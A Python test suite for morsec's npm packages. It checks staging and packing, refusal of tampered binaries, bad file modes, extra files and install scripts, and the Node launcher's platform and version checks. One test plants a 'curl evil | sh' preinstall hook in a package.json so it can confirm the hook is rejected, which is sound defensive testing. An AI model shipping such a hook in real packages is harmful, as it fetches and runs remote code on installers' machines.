"""Tests for morsec's npm packages (loop distribution): packaging/npm/ and packaging/lib/npm.py.

- PackTests: npm.py stage + `npm pack` + npm.py verify on a fake release tarball, and that
  verify catches a tampered binary, a non-executable mode, an extra file and an install script.
- NpmInstallTests: the packs of the debug build installed with npm into a temp project and a
  temp global prefix (offline, temp npm cache): `ms` and `mors` run through the launcher with
  the exit code passed through, and the launcher's refusals (another platform, the platform
  package missing, a version mismatch).
- NpmDoctorTests: a global npm install in the real layout (platform package nested under
  morsec/node_modules), a throwaway msd started from it, then `ms run --link-shims` and
  `ms doctor` through the launcher: the shim is a symlink to the npm package's ms-shim, and the
  launchagent section judges a LaunchAgent into node_modules (present, then gone).

Nothing here uses the real HOME, ~/.npm, the npm global prefix or launchctl.
"""

from __future__ import annotations

import json
import os
import platform
import shutil
import subprocess
import sys
import tarfile
import tempfile
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
PKG = os.path.dirname(HERE)
ROOT = os.path.dirname(PKG)
sys.path.insert(0, os.path.join(PKG, "lib"))
sys.path.insert(0, HERE)

import archive  # noqa: E402
import formula  # noqa: E402
import npm  # noqa: E402
from test_install import BUILT, VERSION, LiveMsd, _snapshot, section  # noqa: E402

IS_MAC_ARM = sys.platform == "darwin" and platform.machine() == "arm64"
SIGN_TARGETS = os.path.join(PKG, "macos", "sign-targets")
TEMPLATES = os.path.join(PKG, "npm")
BINS = [n for n, _ in formula.sign_targets(open(SIGN_TARGETS, encoding="utf-8").read())]


def which(tool: str) -> str:
    p = shutil.which(tool)
    if not p:
        raise AssertionError(f"{tool} is not installed; the npm tests need it (never skipped)")
    return os.path.realpath(p)


NPM = which("npm")
NODE = which("node")


def run(cmd, **kw):
    return subprocess.run(cmd, capture_output=True, text=True, **kw)


def npm_env(d: str) -> dict[str, str]:
    """npm with a temp cache and config, offline, no audit or update checks."""
    cfg, gcfg = os.path.join(d, "npmrc"), os.path.join(d, "npmrc-global")
    for c in (cfg, gcfg):
        if not os.path.exists(c):
            open(c, "w").close()
    return {"PATH": f"{os.path.dirname(NODE)}:{os.path.dirname(NPM)}:/usr/bin:/bin", "HOME": d,
            "npm_config_cache": os.path.join(d, "npm-cache"), "npm_config_userconfig": cfg,
            "npm_config_globalconfig": gcfg, "npm_config_update_notifier": "false",
            "npm_config_audit": "false", "npm_config_fund": "false", "npm_config_offline": "true"}


def release_tarball(d: str, sources: dict[str, str], version: str = VERSION) -> str:
    """A release-shaped tarball (bin/ tools + share/morsec) like release.sh makes."""
    entries = [(sources[b], f"bin/{b}", 0o755) for b in BINS]
    info = os.path.join(d, "BUILDINFO")
    with open(info, "w") as f:
        f.write("placeholder\n")
    entries.append((info, "share/morsec/BUILDINFO", 0o644))
    out = os.path.join(d, f"morsec-{version}-aarch64-apple-darwin.tar.gz")
    archive.build(out, f"morsec-{version}", 1_700_000_000, entries)
    return out


def stage_and_pack(d: str, tarball: str, version: str = VERSION, templates: str = TEMPLATES) -> str:
    out = os.path.join(d, "npm")
    os.makedirs(out)
    npm.stage(tarball, version, "UNLICENSED", templates, SIGN_TARGETS, out)
    r = run([NPM, "pack", "--ignore-scripts", "--silent", "--pack-destination", ".",
             "./morsec-darwin-arm64", "./morsec"], cwd=out, env=npm_env(d))
    if r.returncode != 0:
        raise AssertionError(r.stderr)
    return out


def rewrite_pack(tgz: str, change) -> None:
    """Rewrites an npm pack tarball, letting `change(info, data)` return (info, data) or None."""
    with tarfile.open(tgz, "r:gz") as tf:
        items = [(m, tf.extractfile(m).read() if m.isreg() else None) for m in tf.getmembers()]
    with tarfile.open(tgz, "w:gz") as tf:
        for m, data in items:
            r = change(m, data)
            if r is None:
                continue
            m, data = r
            if data is not None:
                import io
                m.size = len(data)
                tf.addfile(m, io.BytesIO(data))
            else:
                tf.addfile(m)


class PackTests(unittest.TestCase):
    def setUp(self):
        self.d = os.path.realpath(tempfile.mkdtemp(prefix="msnpm"))
        self.addCleanup(shutil.rmtree, self.d)
        srcs = {}
        for b in BINS:
            p = os.path.join(self.d, f"src-{b}")
            with open(p, "wb") as f:
                f.write(b"\xcf\xfa\xed\xfe fake " + b.encode())
            srcs[b] = p
        self.tarball = release_tarball(self.d, srcs)
        self.out = stage_and_pack(self.d, self.tarball)

    def verify(self):
        return npm.verify(self.tarball, VERSION, SIGN_TARGETS, self.out)

    # protects=the packed platform package holds exactly the release tarball's binaries,
    # executable, and neither package has scripts; fails_when=staging drifts from the tarball
    def test_packs_match_the_tarball(self):
        lines = self.verify()
        self.assertEqual(len(lines), len(BINS))
        files = npm.read_pack(os.path.join(self.out, f"morsec-{VERSION}.tgz"))
        m = json.loads(files["package.json"][1])
        self.assertNotIn("scripts", m)
        self.assertEqual(m["optionalDependencies"], {"morsec-darwin-arm64": VERSION})
        self.assertEqual(m["bin"], {"ms": "bin/morsec.js", "mors": "bin/morsec.js"})
        self.assertEqual(m["license"], "UNLICENSED")
        p = json.loads(npm.read_pack(os.path.join(self.out, f"morsec-darwin-arm64-{VERSION}.tgz"))["package.json"][1])
        self.assertEqual((p["os"], p["cpu"]), (["darwin"], ["arm64"]))
        self.assertNotIn("bin", p)
        self.assertNotIn("scripts", p)

    # protects=a binary in the npm pack that differs from the release tarball's is refused;
    # fails_when=verify compares names only
    def test_tampered_binary_is_refused(self):
        tgz = os.path.join(self.out, f"morsec-darwin-arm64-{VERSION}.tgz")
        rewrite_pack(tgz, lambda m, d: (m, d + b"x") if m.name == "package/bin/msd" else (m, d))
        with self.assertRaisesRegex(npm.NpmError, "bin/msd sha256 .* differs"):
            self.verify()

    def test_mode_and_extra_files_are_refused(self):
        tgz = os.path.join(self.out, f"morsec-darwin-arm64-{VERSION}.tgz")
        shutil.copy(tgz, tgz + ".orig")

        def chmod(m, d):
            if m.name == "package/bin/ms":
                m.mode = 0o644
            return m, d
        rewrite_pack(tgz, chmod)
        with self.assertRaisesRegex(npm.NpmError, "not executable"):
            self.verify()
        shutil.copy(tgz + ".orig", tgz)
        os.remove(tgz + ".orig")

        with tarfile.open(tgz, "r:gz") as tf:
            items = [(m, tf.extractfile(m).read() if m.isreg() else None) for m in tf.getmembers()]
        import io
        with tarfile.open(tgz, "w:gz") as tf:
            for m, d in items:
                tf.addfile(m, io.BytesIO(d) if d is not None else None)
            m2 = tarfile.TarInfo("package/bin/extra")
            m2.size = 4
            tf.addfile(m2, io.BytesIO(b"evil"))
        with self.assertRaisesRegex(npm.NpmError, "expected exactly"):
            self.verify()

    # protects=a package.json with scripts (install hooks) is refused at staging and in the
    # pack; fails_when=an install script could ship
    def test_install_scripts_are_refused(self):
        t = os.path.join(self.d, "templates")
        shutil.copytree(TEMPLATES, t)
        pj = os.path.join(t, "morsec", "package.json")
        m = json.load(open(pj))
        m["scripts"] = {"postinstall": "node x.js"}
        json.dump(m, open(pj, "w"))
        with self.assertRaisesRegex(npm.NpmError, "must not have scripts"):
            npm.stage(self.tarball, VERSION, "UNLICENSED", t, SIGN_TARGETS, os.path.join(self.d, "again"))
        tgz = os.path.join(self.out, f"morsec-{VERSION}.tgz")

        def add_scripts(mi, d):
            if mi.name == "package/package.json":
                j = json.loads(d)
                j["scripts"] = {"preinstall": "curl evil | sh"}
                return mi, json.dumps(j).encode()
            return mi, d
        rewrite_pack(tgz, add_scripts)
        with self.assertRaisesRegex(npm.NpmError, "must not have scripts"):
            self.verify()

    def test_templates_have_no_scripts_and_license_mapping(self):
        for name in ("morsec", "morsec-darwin-arm64"):
            text = open(os.path.join(TEMPLATES, name, "package.json")).read()
            self.assertNotIn('"scripts"', text)
            self.assertNotIn("install", json.loads(text.replace("@VERSION@", "1.0.0").replace("@LICENSE@", "MIT")).keys())
        self.assertEqual(npm.npm_license("LicenseRef-Proprietary"), "UNLICENSED")
        self.assertEqual(npm.npm_license("MIT OR Apache-2.0"), "MIT OR Apache-2.0")
        with self.assertRaises(npm.NpmError):
            npm.npm_license("LicenseRef-Other")

    def test_wrapper_lints(self):
        r = run([NODE, "--check", os.path.join(TEMPLATES, "morsec", "bin", "morsec.js")])
        self.assertEqual(r.returncode, 0, r.stderr)


def built_sources() -> dict[str, str]:
    srcs = {b: os.path.join(BUILT, b) for b in BINS}
    for p in srcs.values():
        if not os.path.isfile(p):
            raise AssertionError(f"{p} is not built; run cargo build --workspace first (scripts/check.sh does)")
    return srcs


@unittest.skipUnless(IS_MAC_ARM, "morsec's npm packages are for Apple silicon macOS")
class NpmInstallTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.d = os.path.realpath(tempfile.mkdtemp(prefix="msnpmi"))
        try:
            cls.out = stage_and_pack(cls.d, release_tarball(cls.d, built_sources()))
            cls.plat = os.path.join(cls.out, f"morsec-darwin-arm64-{VERSION}.tgz")
            cls.main = os.path.join(cls.out, f"morsec-{VERSION}.tgz")
        except BaseException:
            shutil.rmtree(cls.d, ignore_errors=True)
            raise

    @classmethod
    def tearDownClass(cls):
        shutil.rmtree(cls.d, ignore_errors=True)

    def setUp(self):
        self.case = tempfile.mkdtemp(dir=self.d)
        self.env = npm_env(self.case)

    def npm(self, *args, cwd=None):
        r = run([NPM, *args], cwd=cwd or self.case, env=self.env)
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        return r

    def ms(self, path, *args, preload=None):
        e = {"PATH": self.env["PATH"], "HOME": self.case}
        cmd = [path, *args]
        if preload:
            p = os.path.join(self.case, "preload.js")
            with open(p, "w") as f:
                f.write(preload)
            cmd = [NODE, "-r", p, os.path.realpath(path), *args]
        return run(cmd, env=e)

    # protects=npm installs (project and global) put working ms and mors on PATH through the
    # launcher, which runs the platform package's binary with the arguments and exit code
    # intact; fails_when=the launcher can't find the package or swallows the exit code;
    # no_claim=the npm registry (offline installs of the packed files; publishing is human)
    def test_project_and_global_installs(self):
        proj = os.path.join(self.case, "proj")
        os.makedirs(proj)
        with open(os.path.join(proj, "package.json"), "w") as f:
            f.write('{"name":"t","private":true}')
        self.npm("install", "--ignore-scripts", self.plat, self.main, cwd=proj)
        for tool in ("ms", "mors"):
            r = self.ms(os.path.join(proj, "node_modules", ".bin", tool), "--version")
            self.assertEqual(r.returncode, 0, r.stderr)
            self.assertIn(f"morsec {VERSION}", r.stdout)
        installed = os.path.join(proj, "node_modules", "morsec-darwin-arm64", "bin")
        for b in BINS:
            self.assertTrue(os.access(os.path.join(installed, b), os.X_OK), b)
        r = self.ms(os.path.join(proj, "node_modules", ".bin", "ms"), "no-such-command")
        self.assertEqual(r.returncode, 2, r.stderr)
        self.assertIn("unrecognized subcommand", r.stderr)

        prefix = os.path.join(self.case, "global")
        self.npm("install", "-g", "--prefix", prefix, self.plat, self.main)
        self.assertEqual(sorted(os.listdir(os.path.join(prefix, "bin"))), ["mors", "ms"])
        r = self.ms(os.path.join(prefix, "bin", "ms"), "--version")
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertIn(f"morsec {VERSION}", r.stdout)

    # protects=on another platform, or an x64 Node.js, the launcher says morsec is Apple
    # silicon only instead of failing obscurely; fails_when=it tries to run the binary
    def test_wrong_platform(self):
        prefix = os.path.join(self.case, "g")
        self.npm("install", "-g", "--prefix", prefix, self.plat, self.main)
        ms = os.path.join(prefix, "bin", "ms")
        r = self.ms(ms, "--version", preload="Object.defineProperty(process, 'platform', {value: 'linux'});")
        self.assertEqual(r.returncode, 1)
        self.assertIn("Apple silicon macOS only (this is linux/arm64)", r.stderr)
        self.assertEqual(r.stdout, "")
        r = self.ms(ms, "--version", preload="Object.defineProperty(process, 'arch', {value: 'x64'});")
        self.assertEqual(r.returncode, 1)
        self.assertIn("darwin/x64", r.stderr)

    # protects=without the platform package (optional dependencies skipped, which is what an
    # offline install of morsec alone does) the launcher names the package and the fix;
    # fails_when=a stack trace or ENOENT instead
    def test_platform_package_missing(self):
        prefix = os.path.join(self.case, "g")
        self.npm("install", "-g", "--prefix", prefix, self.main)
        self.assertFalse(os.path.exists(os.path.join(prefix, "lib", "node_modules", "morsec-darwin-arm64")))
        r = self.ms(os.path.join(prefix, "bin", "ms"), "--version")
        self.assertEqual(r.returncode, 1)
        self.assertIn("morsec-darwin-arm64, which holds morsec's binaries, is not installed", r.stderr)
        self.assertIn("npm install -g morsec", r.stderr)

    # protects=a platform package of another version is refused (half an upgrade);
    # fails_when=ms of one version runs under the launcher of another
    def test_version_mismatch(self):
        prefix = os.path.join(self.case, "g")
        self.npm("install", "-g", "--prefix", prefix, self.plat, self.main)
        pj = os.path.join(prefix, "lib", "node_modules", "morsec-darwin-arm64", "package.json")
        m = json.load(open(pj))
        m["version"] = "9.9.9"
        json.dump(m, open(pj, "w"))
        r = self.ms(os.path.join(prefix, "bin", "ms"), "--version")
        self.assertEqual(r.returncode, 1)
        self.assertIn("the two must be the same version", r.stderr)


@unittest.skipUnless(IS_MAC_ARM, "morsec's npm packages are for Apple silicon macOS")
class NpmDoctorTests(LiveMsd, unittest.TestCase):
    extra_path = os.path.dirname(NODE) + ":"

    @classmethod
    def setUpClass(cls):
        cls.real = _snapshot()
        cls.init_dirs("msnpmd")
        try:
            out = stage_and_pack(cls.dir, release_tarball(cls.dir, built_sources()))
            cls.prefix = os.path.join(cls.dir, "node")
            env = npm_env(cls.dir)
            r = run([NPM, "install", "-g", "--prefix", cls.prefix,
                     os.path.join(out, f"morsec-darwin-arm64-{VERSION}.tgz"), os.path.join(out, f"morsec-{VERSION}.tgz")],
                    env=env)
            if r.returncode != 0:
                raise AssertionError(r.stderr)
            # The registry layout: the optional dependency nested under morsec/node_modules.
            nm = os.path.join(cls.prefix, "lib", "node_modules")
            os.makedirs(os.path.join(nm, "morsec", "node_modules"))
            cls.pkg = os.path.join(nm, "morsec", "node_modules", "morsec-darwin-arm64")
            os.rename(os.path.join(nm, "morsec-darwin-arm64"), cls.pkg)
            cls.msd_path = os.path.join(cls.pkg, "bin", "msd")
            cls.start_msd()
            cls.add_run_key(cls.prefix)
        except BaseException:
            cls.tearDownClass()
            raise

    def tearDown(self):
        self.assertEqual(_snapshot(), self.real, "the npm test touched the real HOME")

    def write_plist(self, msd: str) -> str:
        la = os.path.join(self.home, "Library", "LaunchAgents")
        os.makedirs(la, exist_ok=True)
        tmpl = open(os.path.join(ROOT, "crates", "msd", "launchd", "cc.morsec.msd.plist"), encoding="utf-8").read()
        p = os.path.join(la, "cc.morsec.msd.plist")
        with open(p, "w") as f:
            f.write(tmpl.replace("@MSD@", msd).replace("@LOG@", os.path.join(self.dir, "la.log")))
        return p

    # protects=from an npm install, ms (through the launcher) finds ms-shim in the platform
    # package, --link-shims makes symlinks to that npm path (they follow npm install -g), and
    # doctor passes them; a LaunchAgent into node_modules passes, and once that install is gone
    # doctor fails naming npm and ms init; fails_when=shims are hard links pinned to one
    # version, or a vanished npm install gets no useful advice; no_claim=launchctl (never run;
    # the LaunchAgent is a file in the temp HOME), the npm registry
    def test_shims_and_launchagent(self):
        code, out = self.outside("ms run --link-shims && ms doctor", self.prefix)
        self.assertIn("linked psql", out)
        self.assertIn("✓ 1 shim linked in", section(out, "run shims"), out)
        psql = os.path.join(self.home, ".morsec", "shims", "psql")
        self.assertTrue(os.path.islink(psql))
        self.assertEqual(os.readlink(psql), os.path.join(self.pkg, "bin", "ms-shim"))
        self.assertIn("no LaunchAgent at", section(out, "launchagent"), out)

        self.write_plist(self.msd_path)
        code, out = self.outside("ms doctor", self.prefix)
        la = section(out, "launchagent")
        self.assertIn(f"LaunchAgent starts {self.msd_path}", la, out)
        self.assertNotIn("another install", la)

        # A LaunchAgent from another install (another Node.js version): warn.
        other = os.path.join(self.dir, "node-old", "lib", "node_modules", "morsec", "node_modules",
                             "morsec-darwin-arm64", "bin")
        os.makedirs(other)
        shutil.copy(self.msd_path, os.path.join(other, "msd"))
        self.write_plist(os.path.join(other, "msd"))
        code, out = self.outside("ms doctor", self.prefix)
        self.assertIn("but this ms is another install", section(out, "launchagent"), out)
        # That install is removed (nvm uninstall): fail with the npm advice.
        shutil.rmtree(os.path.join(self.dir, "node-old"))
        code, out = self.outside("ms doctor", self.prefix)
        la = section(out, "launchagent")
        self.assertIn("npm install that is gone", la, out)
        self.assertIn("run: ms init", la)
        self.assertNotEqual(code, 0)


if __name__ == "__main__":
    unittest.main()
